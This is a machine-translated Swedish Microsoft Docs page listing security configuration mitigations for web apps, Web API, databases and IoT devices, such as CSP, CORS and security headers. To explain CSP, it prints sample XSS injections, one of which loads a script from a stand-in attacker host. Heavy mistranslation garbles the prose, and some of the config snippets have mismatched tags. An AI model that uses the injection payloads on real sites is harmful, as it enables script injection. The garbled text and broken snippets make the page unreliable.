---
title: aaaConfiguration Management - hotet Modeling verktyget - Azure | Microsoft Docs
description: "ändringar för hot som exponeras i hello hot Modeling verktyget"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Säkerhet ram: Konfigurationshantering | Åtgärder 
| Produkter eller tjänster | Artikel |
| --------------- | ------- |
| **Webbprogram** | <ul><li>[Implementera innehåll Security Policy (CSP) och inaktivera infogade javascript](#csp-js)</li><li>[Aktivera webbläsarens XSS filter](#xss-filter)</li><li>[ASP.NET-program måste du inaktivera spårning och felsökning tidigare toodeployment](#trace-deploy)</li><li>[Åtkomst från tredje part JavaScript-skript från tillförlitliga källor](#js-trusted)</li><li>[Se till att autentiserade ASP.NET-sidor föra UI Redressing eller klicka på fästpunkter försvar](#ui-defenses)</li><li>[Se till att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET-webbprogram](#cors-aspnet)</li><li>[Aktivera ValidateRequest attribut för ASP.NET-sidor](#validate-aspnet)</li><li>[Använda värdbaserad lokalt senaste versionerna av JavaScript-bibliotek](#local-js)</li><li>[Inaktivera automatisk MIME-kontroll](#mime-sniff)</li><li>[Ta bort standard server rubriker på Windows Azure webbplatser tooavoid fingeravtryck](#standard-finger)</li></ul> |
| **Databas** | <ul><li>[Konfigurera Windows-brandväggen för åtkomst av databasmotor](#firewall-db)</li></ul> |
| **Webb-API** | <ul><li>[Se till att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET Web API](#cors-api)</li><li>[Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känsliga data](#config-sensitive)</li></ul> |
| **IoT-enhet** | <ul><li>[Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter](#admin-strong)</li><li>[Se till att okänd kod inte kan köras på enheter](#unknown-exe)</li><li>[Kryptera OS och ytterligare partitioner i IoT-enhet med BitLocker](#partition-iot)</li><li>[Kontrollera att endast hello minsta tjänster och funktioner är aktiverade på enheter](#min-enable)</li></ul> |
| **Fältet för IoT-Gateway** | <ul><li>[Kryptera OS och ytterligare partitioner för Gateway för IoT-fältet med BitLocker](#field-bit-locker)</li><li>[Se till att hello standard inloggningsuppgifterna för hello fältet gateway ändras under installationen](#default-change)</li></ul> |
| **Gateway för IoT-moln** | <ul><li>[Se till att hello Gateway moln som implementerar en process tookeep hello anslutna enheter inbyggd programvara in toodate](#cloud-firmware)</li></ul> |
| **Datorn Förtroendegräns** | <ul><li>[Se till att enheterna har slutpunkt säkerhetsåtgärder konfigurerats enligt organisationens principer](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Se till att säker hantering av Azure storage snabbtangenter](#secure-keys)</li><li>[Se till att endast betrodda ursprung tillåts om CORS är aktiverat på Azure-lagring](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Aktivera begränsning av funktionens WCF-tjänsten](#throttling)</li><li>[WCF-Information sprids via metadata](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementera innehåll Security Policy (CSP) och inaktivera infogade javascript

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [En introduktion tooContent säkerhetsprincip](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [innehåll säkerhet principreferens](http://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introduktion toocontent säkerhetsprincip](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Kan du använda CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Steg** | <p>Innehåll Security Policy (CSP) är en skydd på djupet säkerhetsmekanism, en W3C som standard, som gör att programmet ägare toohave webbkontroll på hello innehåll, inbäddat i deras plats. CSP läggs till som en HTTP-svarshuvud på hello webbserver och tillämpas på klientsidan för hello av webbläsare. Det är en godkänd lista principbaserad - en webbplats kan deklarera en uppsättning betrodda domäner från det aktiva innehållet, t.ex. JavaScript kan läsas in.</p><p>CSP innehåller följande säkerhetsfördelarna hello:</p><ul><li>**Skydd mot XSS:** om en sida är sårbar tooXSS kan en angripare kan utnyttja den 2 sätt:<ul><li>Mata in `<script>malicious code</script>`. Den här utnyttja fungerar inte på grund av Toocsp's grundläggande begränsning-1</li><li>Mata in `<script src=”http://attacker.com/maliciousCode.js”/>`. Den här utnyttja fungerar inte eftersom hello angripare kontrollerade domänen är inte i CSP godkänd lista över domäner</li></ul></li><li>**Kontroll över data exfiltration:** om någon skadlig innehåll på en webbsida försöker tooconnect tooan extern webbplats och stjäla data, hello anslutningen kommer att avbrytas av CSP. Detta beror på att hello måldomänen är inte i listan över godkända CSP</li><li>**Skydd mot Klicka fästpunkter:** Klicka fästpunkter är en teknik för angrepp med som en angriparen kan ram en äkta webbplats och tvinga användare tooclick för UI-element. För närvarande uppnås skydd mot Klicka fästpunkter genom att konfigurera ett svar huvud-X-ram-alternativ. Det här sidhuvudet värnar om inte alla webbläsare och gå framåt CSP blir ett standardiserat sätt toodefend mot fästpunkter klickar du på</li><li>**Rapportering i realtid attack:** om en injection attack på en webbplats med CSP-aktiverad webbläsare automatiskt utlöser en aviseringsslutpunkten tooan som konfigurerats på hello webbserver. Det här sättet CSP fungerar som en realtid varningssystem.</li></ul> |

### <a name="example"></a>Exempel
Exempelprincip: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Den här principen kan skript tooload endast från programmet hello-web server och google analytics server. Skript som läses in från en annan plats att avvisas. När CSP aktiveras på en webbplats, är hello följande funktioner automatiskt inaktiverade toomitigate XSS attacker. 

### <a name="example"></a>Exempel
Infogade skript körs inte. Följande är exempel på infogade skript 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exempel
Strängar utvärderas inte som kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Aktivera webbläsarens XSS filter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [XSS skydd Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Steg** | <p>Kontroller för X XSS skydd svar rubrik configuration hello webbläsarens över flera skript filter. Den här svarshuvud kan ha följande värden:</p><ul><li>`0:`Detta inaktiverar hello filter</li><li>`1: Filter enabled`Om en attack med scripting webbplatser har upptäckts i ordning toostop hello-attack hello webbläsare kommer att rensa hello sida</li><li>`1: mode=block : Filter enabled`. I stället för att rensa hello sidan om en attack med XSS upptäcks, hindrar hello webbläsaren återgivningen av hello sida</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. hello webbläsare kommer Rensa hello sida och rapporten hello överträdelse.</li></ul><p>Detta är en funktion för krom som använder CSP överträdelse rapporter toosend information tooa URI för ditt val. hello betraktas senaste 2 alternativ som säker värden.</p>|

## <a id="trace-deploy"></a>ASP.NET-program måste du inaktivera spårning och felsökning tidigare toodeployment

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [ASP.NET-felsökning översikt](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET spårning översikt](http://msdn2.microsoft.com/library/bb386420.aspx), [så här: Aktivera spårning för ASP.NET-programmet](http://msdn2.microsoft.com/library/0x5wc973.aspx), [så: aktivera felsökning för ASP.NET-program](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Steg** | När spårning är aktiverat för hello-sidan, hämtar alla webbläsare som begär den också hello spårningsinformation som innehåller information om internt tillstånd och arbetsflödet. Denna information kan vara känslig säkerhet. När felsökning aktiveras för hello-sidan, visas fel händer hello server resultera i en fullständig stack spårningsdata toohello webbläsare. Dessa data kan visa känslig information om arbetsflödet hello server. |

## <a id="js-trusted"></a>Åtkomst från tredje part JavaScript-skript från tillförlitliga källor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | tredjeparts-JavaScript-skript ska refereras endast från tillförlitliga källor. hello referens slutpunkter ska alltid vara på SSL. |

## <a id="ui-defenses"></a>Se till att autentiserade ASP.NET-sidor föra UI Redressing eller klicka på fästpunkter försvar

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [OWASP fästpunkter Defense Cheat blad klickar du på](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - bekämpa Klicka fästpunkter med X-ram-alternativ](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Steg** | <p>Klicka på fästpunkter, även kallat en ”UI hur de attack”, är när en angripare använder flera transparent eller täckande lager tootrick en användare genom att klicka på en knapp eller en länk på en annan sida när de avser tooclick på översta nivån hello-sidan.</p><p>Dessa lager uppnås genom att utforma en skadlig sida med en iframe som läser in hello drabbade sidan. Därför klickar hello angripare ”kapar” avsedd för deras sida och skicka dem tooanother sidan troligen ägs av ett annat program, domän, eller båda. tooprevent Klicka fästpunkter attacker set hello rätt X-ram-alternativ för HTTP-svarshuvuden som instruerar hello webbläsare toonot Tillåt synkroniseringstecken från andra domäner</p>|

### <a name="example"></a>Exempel
hello huvudet för X-ram-alternativ kan anges via IIS web.config. Web.config kodstycke för platser som ska aldrig framed: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exempel
Web.config-koden för platser som ska endast framed av sidor i hello samma domän: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Se till att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET-webbprogram

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Webbformulär, MVC5 |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | <p>Webbläsare säkerhet förhindrar att en webbsida gör AJAX-begäranden tooanother domän. Den här begränsningen kallas hello samma ursprung princip och förhindrar att en skadlig webbplats läsning av känsliga data från en annan plats. Men ibland kanske krävs tooexpose API: er på ett säkert sätt som andra platser kan använda. Mellan Origin Resource Sharing (CORS) är en W3C-standard som gör att en server toorelax hello samma ursprung princip. Med hjälp av CORS, kan en server uttryckligen tillåta vissa cross-origin-begäranden när avvisa andra.</p><p>CORS är säkrare och mer flexibelt än tidigare tekniker, till exempel hanteras JSONP. I grunden är hur du aktiverar CORS översätter tooadding några HTTP-svarshuvuden (Access - Control-*) toohello webbprogram och detta kan göras på ett par olika sätt.</p>|

### <a name="example"></a>Exempel
Om åtkomst tooWeb.config är tillgänglig, kan CORS läggas med hello följande kod: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exempel
Om åtkomst tooweb.config inte är tillgänglig kan CORS konfigureras genom att lägga till hello följande CSharp-kod: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Observera att det är kritiska tooensure som hello lista över ursprung i ”Access-Control-Tillåt-ursprung”-attribut är ange tooa ändligt och betrodda uppsättning ursprung. Misslyckas tooconfigure så att (t.ex. ställer in hello-värde som ' *') kan skadliga webbplatser tootrigger mellan origin-begäranden toohello webbprogram > utan begränsningar, vilket gör hello programmet sårbara tooCSRF attacker. 

## <a id="validate-aspnet"></a>Aktivera ValidateRequest attribut för ASP.NET-sidor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Webbformulär, MVC5 |
| **Attribut**              | Saknas  |
| **Referenser**              | [Begära validering - hindrar skript attacker](http://www.asp.net/whitepapers/request-validation) |
| **Steg** | <p>Begäran om verifiering, en funktion i ASP.NET sedan version 1.1 förhindrar hello servern accepterar innehåll som innehåller icke kodade HTML. Funktionen är avsedd toohelp att förhindra att vissa skript injection där klienten skriptkod eller HTML kan vara utan vetskap skickade tooa server, lagras och sedan presenteras tooother användare. Vi rekommenderar ändå starkt att du validerar alla indata och HTML koda den vid behov.</p><p>Begäran om verifiering utförs genom att jämföra alla indata tooa lista över potentiellt farliga värden. Om en matchning inträffar ASP.NET genererar en `HttpRequestValidationException`. Begäran om verifiering funktionen är aktiverad som standard.</p>|

### <a name="example"></a>Exempel
Men kan den här funktionen inaktiveras på sidan nivå: 
```XML
<%@ Page validateRequest="false" %> 
```
eller på programnivå 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observera begära verifiering funktionen stöds inte och är inte en del av MVC6 pipeline. 

## <a id="local-js"></a>Använda värdbaserad lokalt senaste versionerna av JavaScript-bibliotek

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | <p>Utvecklare som använder standard JavaScript-bibliotek som JQuery måste använda godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhetsbrister. En bra idé är toouse hello mest senaste versionen av hello bibliotek, eftersom de innehåller säkerhetskorrigeringar för kända problem i sina äldre versioner.</p><p>Om hello den senaste versionen inte kan användas på grund av toocompatibility skäl, ska hello under minsta versioner användas.</p><p>Godkända minsta versioner:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validera 1.9.</li><li>JQuery Mobile 1.0.1</li><li>JQuery cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-kontrollen Toolkit**<ul><li>AJAX-kontrollen Toolkit 40412</li></ul></li><li>**ASP.NET-webbformulär och Ajax**<ul><li>ASP.NET-webbformulär och Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Läsa in något JavaScript-bibliotek från externa platser, till exempel offentliga CDN-nät aldrig</p>|

## <a id="mime-sniff"></a>Inaktivera automatisk MIME-kontroll

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [En del IE8 säkerhet V: heltäckande skydd](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-typ](http://en.wikipedia.org/wiki/Mime_type) |
| **Steg** | hello X-innehåll-typ-alternativ rubrik är ett HTTP-huvud som gör att utvecklare toospecify att innehållet inte får någon MIME-lyssnar. Det här sidhuvudet är utformad toomitigate MIME-kontroll attacker. För varje sida som kan innehålla användare kan kontrolleras innehåll, måste du använda hello HTTP-sidhuvudet X-innehåll-typ-alternativ: nosniff. tooenable hello obligatorisk rubrik globalt för alla sidor i hello program, kan du göra något av följande hello|

### <a name="example"></a>Exempel
Lägg till hello sidhuvud i hello Web.config om programmet hello finns av Internet Information Services (IIS) 7 och senare. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exempel
Lägg till sidhuvud hello via hello globala programmet\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exempel
Implementera anpassade HTTP-modul 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exempel
Du kan aktivera hello obligatorisk rubrik endast för specifika sidor genom att lägga till den tooindividual svar: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Ta bort standard server rubriker på Windows Azure webbplatser tooavoid fingeravtryck

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | EnvironmentType – Azure |
| **Referenser**              | [Tar bort standardserver huvuden på Windows Azure-webbplatser](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Steg** | Huvuden, till exempel Server X-påslagen-efter X-AspNet-Version avslöja information om hello server och hello underliggande tekniker. Det rekommenderas toosuppress dessa huvuden vilket förhindrar fingeravtryck hello program |

## <a id="firewall-db"></a>Konfigurera Windows-brandväggen för åtkomst av databasmotor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Databas | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | SQL Azure bör OnPrem |
| **Attribut**              | Ej tillämpligt, Version av SQL - V12 |
| **Referenser**              | [Hur tooconfigure en Azure SQL-databas brandväggen](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [konfigurera Windows-brandväggen för åtkomst av databasmotor](https://msdn.microsoft.com/library/ms175043) |
| **Steg** | Brandväggssystem förhindra obehörig åtkomst toocomputer resurser. tooaccess en instans av hello SQL Server Database Engine via en brandvägg måste du konfigurera hello brandväggen på hello-dator som kör SQL Server-tooallow åtkomst |

## <a id="cors-api"></a>Se till att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET Web API

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | MVC 5 |
| **Attribut**              | Saknas  |
| **Referenser**              | [Aktivera Cross-Origin-begäranden i ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - CORS-stöd i ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Steg** | <p>Webbläsare säkerhet förhindrar att en webbsida gör AJAX-begäranden tooanother domän. Den här begränsningen kallas hello samma ursprung princip och förhindrar att en skadlig webbplats läsning av känsliga data från en annan plats. Men ibland kanske krävs tooexpose API: er på ett säkert sätt som andra platser kan använda. Mellan Origin Resource Sharing (CORS) är en W3C-standard som gör att en server toorelax hello samma ursprung princip.</p><p>Med hjälp av CORS, kan en server uttryckligen tillåta vissa cross-origin-begäranden när avvisa andra. CORS är säkrare och mer flexibelt än tidigare tekniker, till exempel hanteras JSONP.</p>|

### <a name="example"></a>Exempel
Lägg till följande kod toohello WebApiConfig.Register metoden hello i hello App_Start/WebApiConfig.cs, 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exempel
EnableCors-attributet kan vara tillämpade tooaction metoder i en domänkontrollant på följande sätt: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observera att det är kritiska tooensure som hello lista över ursprung i EnableCors attribut är ange tooa ändligt och betrodda uppsättning ursprung. Misslyckas tooconfigure detta felaktigt (t.ex. ställer in hello-värde som ' *') kan skadliga webbplatser tootrigger mellan ursprung begäranden toohello API utan begränsningar, > vilket gör hello API sårbara tooCSRF attacker. EnableCors kan innehålla på domänkontrollanten nivå. 

### <a name="example"></a>Exempel
toodisable CORS för en viss metod i en klass, hello DisableCors attributet kan användas som visas nedan: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | MVC 6 |
| **Attribut**              | Saknas  |
| **Referenser**              | [Aktivera Cross-Origin-begäranden (CORS) i ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Steg** | <p>I ASP.NET Core 1.0 kan CORS aktiveras antingen med hjälp av mellanprogram eller MVC. När du använder MVC tooenable CORS hello samma CORS-tjänster används, men hello saknas CORS mellanprogram.</p>|

**Metod 1** aktiverar CORS med mellanprogram: tooenable CORS för hela programmet för hello lägga till hello CORS mellanprogram toohello förfrågnings-pipelinen metoden hello UseCors tillägg. En princip för cross-origin kan anges när du lägger till hello CORS mellanprogram hello CorsPolicyBuilder-klassen. Det finns två sätt toodo detta:

### <a name="example"></a>Exempel
hello är först toocall UseCors med ett lambda-uttryck. hello lambda tar ett CorsPolicyBuilder-objekt: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exempel
hello är andra toodefine en eller flera namngivna CORS-principer och välj sedan hello principen efter namn vid körning. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Metod 2** aktiverar CORS i MVC: utvecklare kan också använda MVC tooapply specifika CORS per åtgärd per styrenhet eller globalt för alla domänkontrollanter.

### <a name="example"></a>Exempel
Per åtgärd: toospecify en princip för CORS för en specifik åtgärd Lägg till hello [EnableCors] attributet toohello åtgärd. Ange hello principnamn. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exempel
Per styrenhet: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exempel
Globalt: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observera att det är kritiska tooensure som hello lista över ursprung i EnableCors attribut är ange tooa ändligt och betrodda uppsättning ursprung. Misslyckas tooconfigure detta felaktigt (t.ex. ställer in hello-värde som ' *') kan skadliga webbplatser tootrigger mellan ursprung begäranden toohello API utan begränsningar, > vilket gör hello API sårbara tooCSRF attacker. 

### <a name="example"></a>Exempel
toodisable CORS för en domänkontrollant eller åtgärden hello [DisableCors] attribut. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känsliga data

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [Så här: Kryptera konfigurationsavsnitt i ASP.NET 2.0 med hjälp av DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [att ange en Konfigurationsprovider för skyddade](https://msdn.microsoft.com/library/68ze1hb2.aspx), [med hjälp av Azure Key Vault tooprotect programmet hemligheter](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Steg** | Konfigurationsfiler, till exempel hello Web.config appsettings.json är ofta används toohold känslig information, inklusive användarnamn, lösenord, databasanslutningssträngar och krypteringsnycklar. Om du inte skyddar informationen är ditt program sårbar tooattackers eller angripare erhålla känslig information, till exempel användarnamn och lösenord, databasnamn och servernamn. Baserat på hello distributionstypen (azure/lokalt), kryptera hello känsliga grupper i config-filer med hjälp av DPAPI eller tjänster som Azure Key Vault. |

## <a id="admin-strong"></a>Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | Alla administrativa gränssnitt hello enheten eller fältet gateway visar bör skyddas med hjälp av starka autentiseringsuppgifter. Även andra gränssnitt t.ex. WiFi, SSH, filresurser, FTP bör skyddas med starka autentiseringsuppgifter. Standard svaga lösenord inte ska användas. |

## <a id="unknown-exe"></a>Se till att okänd kod inte kan köras på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [Aktivera säker start och BitLocker enhetskryptering på Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Steg** | Säker Start i UEFI begränsar hello system tooonly fjärrkörning av binärfiler som signerats av en angiven utfärdare. Den här funktionen förhindrar okänd kod körs på hello plattform och minskad hello säkerhetstillståndet av det potentiellt. Aktivera säker Start i UEFI och begränsa hello lista över certifikatutfärdare som är betrodda för signering kod. Logga all kod som har distribuerats på hello-enhet med hjälp av en av hello betrodda utfärdare. |

## <a id="partition-iot"></a>Kryptera OS och ytterligare partitioner i IoT-enhet med BitLocker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | Windows 10 IoT Core implementerar en förenklad version av BitLocker enhetskryptering, som har en stark beroende hello förekomst av TPM på hello plattform, inklusive hello nödvändiga preOS protokoll i UEFI som utför hello nödvändiga mått. Måtten preOS se till att hello OS senare har en slutgiltig post för hur hello OS startades. Kryptera OS-partitioner som använder BitLocker och alla ytterligare partitioner även om de kan innehålla känsliga data. |

## <a id="min-enable"></a>Kontrollera att endast hello minsta tjänster och funktioner är aktiverade på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | Inte aktivera eller inaktivera alla funktioner eller tjänster i hello operativsystem som inte krävs för hello fungerar hello lösning. För t.ex. Om hello enheten inte kräver en UI toobe distribueras, installera Windows IoT Core i fjärradministrerade läge. |

## <a id="field-bit-locker"></a>Kryptera OS och ytterligare partitioner för Gateway för IoT-fältet med BitLocker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Fältet för IoT-Gateway | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
